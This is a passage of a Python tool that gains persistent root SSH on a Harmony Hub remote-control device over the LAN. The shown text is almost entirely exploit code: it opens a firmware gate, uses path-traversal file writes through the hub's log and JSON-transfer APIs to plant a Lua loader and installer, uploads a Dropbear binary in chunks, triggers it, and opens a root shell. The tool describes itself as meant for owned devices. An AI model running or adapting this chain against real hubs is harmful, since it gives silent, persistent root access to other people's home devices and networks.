            info("TDE gate opened after WebSocket marker write.")
            return
        if resp.code == "594":
            reopen_xmpp_after_app_restart(
                xmpp,
                host,
                xmpp_port,
                "WebSocket marker write was accepted, but TDE gate is still closed",
            )
            ok, resp = tde_readback(xmpp, "verify /etc/tdeenable after WebSocket app restart")
            if ok:
                info("TDE gate opened after WebSocket marker write and app-layer restart.")
                return

    if resp.code == "594":
        raise SystemExit(
            "TDE gate stayed closed after marker write attempts. "
            "That means the hub accepted harmony.log?put, but /etc/tdeenable was not visible to system.tdeEnable(). "
            "Run this again after a cold power-cycle; if it repeats, capture the full output because the write primitive is landing somewhere else."
        )
    if resp.code != "200":
        raise SystemExit(f"verify /etc/tdeenable failed: code={resp.code or '?'} error={resp.error or '-'}")
    raise SystemExit("TDE readback did not contain expected marker")


def upload_and_install(
    xmpp: XmppTransport,
    host: str,
    xmpp_port: int,
    hbus_port: int,
    domain: str,
    package_name: str,
    stage_path: str,
    manifest: dict[str, Any],
    chunks: dict[str, str],
    sysinfo_payload: str,
) -> tuple[str, list[str]]:
    package_abs = f"/pkg/{package_name}"
    stage_chunks_abs = stage_path + "/chunks"

    open_tde_gate(xmpp, host, xmpp_port, hbus_port, domain, sysinfo_payload)
    step("Finding WebSocket Hub ID")
    info("The installer uses XMPP for the initial gate and WebSocket for structured package writes.")
    hub_ids = collect_hub_ids(host, hbus_port, xmpp, sysinfo_payload)
    selected_hub_id = hub_ids[0] if hub_ids else ""
    if hub_ids:
        print("auto_detected_hub_ids=" + ",".join(hub_ids))
    else:
        info("No WebSocket hub id was auto-detected; falling back to XMPP where possible.")

    def raw_log_put(file_name: str, data: str, label: str, timeout: int = 30, quiet: bool = False) -> None:
        if hub_ids and websocket_log_put(host, hbus_port, domain, hub_ids, file_name, data, label, timeout, quiet):
            return
        log_put(xmpp, file_name, data, label, timeout)

    def structured_put(path: str, file_name: str, content: Any, label: str, timeout: int = 30) -> None:
        if hub_ids and websocket_json_put(host, hbus_port, domain, hub_ids, path, file_name, content, label, timeout):
            return
        json_put(xmpp, path, file_name, content, label)

    step("Staging Installer Package")
    info(f"Temporary package: {package_name}")
    info(f"Temporary stage path: {stage_path}")
    info("Writing a tiny Lua loader plus split installer chunks so the hub's log writer does not create empty files.")
    print(f"Uploading Lua installer package {package_name}...")
    structured_put(data_traversal_path(package_abs), "manifest.json", {"plugin": package_name}, "write package manifest")
    structured_put(data_traversal_path(stage_chunks_abs), ".mkdir.json", {"ok": True}, "create stage chunks dir")
    raw_log_put(cache_traversal_path(package_abs + "/" + package_name + ".lua"), build_loader_lua(stage_path), "write package loader lua")
    stager_parts = split_text(build_stager_lua(stage_path), LUA_CHUNK_SIZE)
    info(f"Hub-side installer Lua split into {len(stager_parts)} parts of at most {LUA_CHUNK_SIZE} bytes.")
    raw_log_put(cache_traversal_path(stage_path + "/loader.count"), str(len(stager_parts)) + "\n", "write loader count")
    for index, part in enumerate(stager_parts, 1):
        raw_log_put(cache_traversal_path(stage_path + f"/loader.{index}"), part, f"loader part {index}/{len(stager_parts)}")
    structured_put(
        data_traversal_path(stage_path),
        "manifest.json",
        json.dumps(manifest, separators=(",", ":")) + "\n",
        "write stage manifest",
    )

    step("Verifying Staged Files")
    info("Opening a fresh XMPP session before readback because long WebSocket write bursts can stale the old session.")
    refresh_xmpp_session(xmpp, host, xmpp_port, "Refreshing XMPP session before readback checks...")
    pkg = json_get(xmpp, data_traversal_path(package_abs), "manifest.json", "read package manifest")
    plugin = json_get(xmpp, data_traversal_path(package_abs), package_name + ".lua", "read package lua")
    stage = json_get(xmpp, data_traversal_path(stage_path), "manifest.json", "read stage manifest")
    if package_name not in pkg.payload or stage_path not in plugin.payload or "rootssh-lan-xmpp" not in stage.payload:
        raise SystemExit("readback mismatch; refusing to trigger installer")

    step("Uploading Persistent SSH Payload")
    info("This is the slow part. Chunks are deliberately small to avoid the firmware's silent log-write truncation.")
    print(f"Uploading {len(chunks)} Dropbear payload chunks...")
    for index, name in enumerate(sorted(chunks), 1):
        if index == 1 or index == len(chunks) or index % 25 == 0:
            print(f"  chunk {index}/{len(chunks)}")
        raw_log_put(cache_traversal_path(stage_chunks_abs + "/" + name), chunks[name], f"chunk {name}", timeout=45, quiet=True)

    step("Running Hub-Side Installer")
    info("Triggering the temporary automation package so the hub writes files, sets executable modes, and starts Dropbear.")
    refresh_xmpp_session(xmpp, host, xmpp_port, "Refreshing XMPP session before triggering installer...")
    triggered = False
    if hub_ids:
        print("Triggering installer through WebSocket automation discovery...")
        for hub_id in hub_ids:
            try:
                ws = WebSocketTransport(host, hub_id, hbus_port, domain)
                ws_resp = ws.call("harmony.automation?discover", {"gatewayType": package_name}, 240)
            except TimeoutError:
                print(f"websocket discover timed out for hub id {hub_id}; installer may still be running")
                triggered = True
                break
            except Exception as exc:  # noqa: BLE001
                print(f"websocket discover failed for hub id {hub_id}: {exc}")
                continue
            ws_code = response_code(ws_resp)
            print(f"websocket discover: code={ws_code or '?'} preview={response_preview(ws_resp, 700)}")
            if ws_code == "200":
                triggered = True
                selected_hub_id = hub_id
                break
            if ws_code not in ("202", "203"):
                break
            time.sleep(5)

    if not triggered:
        print("WebSocket trigger was not available; trying XMPP automation discovery...")
        discover = xmpp.call("harmony.automation?discover", f"gatewayType={package_name}", 60)
        print_xmpp("xmpp discover", discover)
        if discover.code != "200":
            raise SystemExit(f"automation discover failed: code={discover.code or '?'} error={discover.error or '-'}")

    time.sleep(3)
    result = xmpp.call("connect.jsonfiletransfer?get", jft_get_body(data_traversal_path(stage_path), "result.json"), 30)
    print_xmpp("installer result", result)
    if result.code == "200" and result.payload:
        parsed = parse_json_maybe(result.payload)
        if isinstance(parsed, dict):
            print("installer_ok=" + str(parsed.get("ok")))
            if not parsed.get("ok"):
                raise SystemExit("installer reported failure: " + str(parsed.get("error")))
            info("Hub-side installer reported success.")
    return selected_hub_id, hub_ids


def wait_for_port(host: str, port: int, timeout_s: int) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            with socket.create_connection((host, port), timeout=3):
                return True
        except OSError:
            time.sleep(2)
    return False


def open_root_shell(host: str, private_key: pathlib.Path) -> int:
    ssh = require_tool("ssh")
    ssh = [
        ssh,
        "-i", str(private_key),
        "-o", "IdentitiesOnly=yes",
        "-o", "StrictHostKeyChecking=accept-new",
        f"root@{host}",
    ]
    print("")
    print("Opening root shell. Type 'exit' to leave it.")
    return subprocess.call(ssh)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Root an owned Harmony Hub over LAN using the original XMPP path.")
    parser.add_argument("--host", help="Harmony Hub IP address. If omitted, prompts interactively.")
    parser.add_argument("--xmpp-port", type=int, default=DEFAULT_XMPP_PORT)
    parser.add_argument("--hbus-port", type=int, default=DEFAULT_HBUS_PORT)
    parser.add_argument("--domain", default=DEFAULT_DOMAIN)
    parser.add_argument(
        "--hub-id",
        action="append",
        help="Known numeric hub ID for the 8088 XMPP-enable preflight. Can be passed more than once.",
    )
    parser.add_argument("--dropbearmulti", default="dropbearmulti")
    parser.add_argument("--private-key", default=str(default_key_path()))
    parser.add_argument("--pubkey", help="Public key to install. Default: <private-key>.pub")
    parser.add_argument("--chunk-size", type=int, default=DEFAULT_CHUNK_SIZE)
    parser.add_argument("--ssh-wait", type=int, default=120)
    parser.add_argument(
        "--xmpp-enable-wait",
        type=int,
        default=90,
        help="Seconds to wait for port 5222 after toggling enableXMPP over 8088. Default: 90.",
    )
    parser.add_argument(
        "--no-enable-xmpp",
        action="store_true",
        help="Do not try the 8088 automation-config preflight when XMPP is closed.",
    )
    parser.add_argument(
        "--enable-xmpp-only",
        action="store_true",
        help="Try to enable XMPP over 8088, then exit without installing root SSH.",
    )
    parser.add_argument("--package-name", help="Temporary package name. Default: fresh random name.")
    parser.add_argument("--no-shell", action="store_true", help="Install/start Dropbear but do not launch interactive SSH.")
    parser.add_argument("--dry-run", action="store_true", help="Validate local payload only; do not contact the hub.")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    step("Harmony Hub LAN Root SSH Installer")
    info("This tool is for an owned Harmony Hub on the same LAN as this computer.")
    info("It installs persistent root SSH, then optionally opens an interactive root shell.")
    host = args.host.strip() if args.host else ""
    if not host and not args.dry_run:
        host = input("Harmony Hub IP address: ").strip()
    if not host and not args.dry_run:
        raise SystemExit("hub IP is required")
    if args.xmpp_enable_wait < 5:
        raise SystemExit("--xmpp-enable-wait must be at least 5 seconds")

    if args.enable_xmpp_only:
        if args.no_enable_xmpp:
            raise SystemExit("--enable-xmpp-only conflicts with --no-enable-xmpp")
        if args.dry_run:
            print("dry_run=true")
            info("Dry run complete: no network calls were made.")
            return
        step("Enable XMPP Only")
        info("Trying the Harmony app's automation-config toggle over 8088, then exiting.")
        if not enable_xmpp_with_websocket(
            host,
            args.hbus_port,
            args.domain,
            collect_xmpp_enable_hub_ids(host, args.hbus_port, args.hub_id),
            args.xmpp_port,
            args.xmpp_enable_wait,
        ):
            raise SystemExit(
                "XMPP is not reachable and the 8088 enableXMPP preflight did not open it. "
                "Try passing --hub-id <id>, or enable XMPP once in the Harmony app."
            )
        info("XMPP enable-only run complete.")
        return

    dropbearmulti = resolve_input_path(args.dropbearmulti)
    private_key = pathlib.Path(args.private_key).expanduser()
    public_key = pathlib.Path(args.pubkey).expanduser() if args.pubkey else pathlib.Path(str(private_key) + ".pub")
    package_name = validate_package_name(args.package_name or fresh_package_name())
    stage_path = f"/data/{package_name}_stage"

    step("Local Payload Checks")
    info("Checking bundled Dropbear binary, SSH key, package name, and chunk limits before touching the hub.")
    if not dropbearmulti.is_file():
        raise SystemExit(f"dropbearmulti not found: {dropbearmulti}")
    machine = elf_machine(dropbearmulti)
    if machine is None:
        raise SystemExit("dropbearmulti is not an ELF binary")
    if machine[0] != 8:
        raise SystemExit(f"expected MIPS dropbearmulti, got {machine[1]} machine={machine[0]}")
    if args.chunk_size < 256 or args.chunk_size > 1500:
        raise SystemExit("--chunk-size must be between 256 and 1500 for this firmware's log-write size limit")

    ensure_keypair(private_key, public_key)
    if not public_key.is_file():
        raise SystemExit(f"public key not found: {public_key}")

    manifest, chunks = build_payload(dropbearmulti, public_key, args.chunk_size)
    print(f"dropbearmulti={dropbearmulti}")
    print(f"dropbearmulti_sha256={sha256_file(dropbearmulti)}")
    print(f"dropbearmulti_elf_machine={machine[0]} ({machine[1]})")
    print(f"pubkey={public_key}")
    print(f"temporary_package={package_name}")
    print(f"payload_files={len(manifest['files'])} payload_chunks={len(chunks)}")
    if args.dry_run:
        print("dry_run=true")
        info("Dry run complete: local payload is valid and no network calls were made.")
        return

    if not args.no_enable_xmpp:
        step("XMPP Availability")
        info("If port 5222 is closed, the tool will try the Harmony app's automation-config toggle over 8088.")
        if not enable_xmpp_with_websocket(
            host,
            args.hbus_port,
            args.domain,
            collect_xmpp_enable_hub_ids(host, args.hbus_port, args.hub_id),
            args.xmpp_port,
            args.xmpp_enable_wait,
        ):
            raise SystemExit(
                "XMPP is not reachable and the 8088 enableXMPP preflight did not open it. "
                "Try passing --hub-id <id>, or enable XMPP once in the Harmony app."
            )

    step("Connecting To Hub")
    info(f"Opening local XMPP API at {host}:{args.xmpp_port}.")
    with XmppTransport(host, args.xmpp_port) as xmpp:
        sysinfo = xmpp.call("connect.sysinfo?get", "", 15)
        print_xmpp("connect.sysinfo?get", sysinfo)
        info("Hub responded; continuing with the installer.")
        hub_id, hub_id_candidates = upload_and_install(
            xmpp,
            host,
            args.xmpp_port,
            args.hbus_port,
            args.domain,
            package_name,
            stage_path,
            manifest,
            chunks,
            sysinfo.payload,
        )

    if hub_id:
        step("Hub ID Handoff")
        print(f"hub_id={hub_id}")
        if hub_id_candidates:
            print("hub_id_candidates=" + ",".join(hub_id_candidates))
        for path in save_hub_id_handoff(host, hub_id, hub_id_candidates):
            print(f"wrote_hub_id_file={path}")
        info("The Harmony Hub Control web UI installer reads the per-user handoff file automatically.")
    else:
        print("")
        print("WARNING: Root SSH was installed, but no Hub ID was detected.")
        print("The web UI installer requires the real Hub ID. Re-run this tool with the hub online and save the full output.")

    step("Waiting For SSH")
    info("The installer has finished; waiting for Dropbear to listen on port 22.")
    print(f"Waiting for SSH on {host}:{DEFAULT_SSH_PORT}...")
    ssh_up = wait_for_port(host, DEFAULT_SSH_PORT, args.ssh_wait)
    print("ssh_port_22_open=" + str(ssh_up))
    if not ssh_up:
        raise SystemExit("Dropbear did not open port 22 inside the wait window")
    if not args.no_shell:
        step("Opening Root Shell")
        info("If OpenSSH reports a changed host key, the install still succeeded; reconnect after removing the old known_hosts entry.")
        ssh_code = open_root_shell(host, private_key)
        if ssh_code != 0:
            print("")
            print("WARNING: SSH is installed and port 22 is open, but the final SSH client exited with code " + str(ssh_code) + ".")
            print("If this was a host-key or known_hosts warning, remove the old hub entry from your known_hosts file and reconnect:")
            print(f"  ssh -i {private_key} -o IdentitiesOnly=yes root@{host}")
        return
    step("Done")
    print(f"Root SSH is ready: ssh -i {private_key} root@{host}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        raise SystemExit("\nInterrupted")
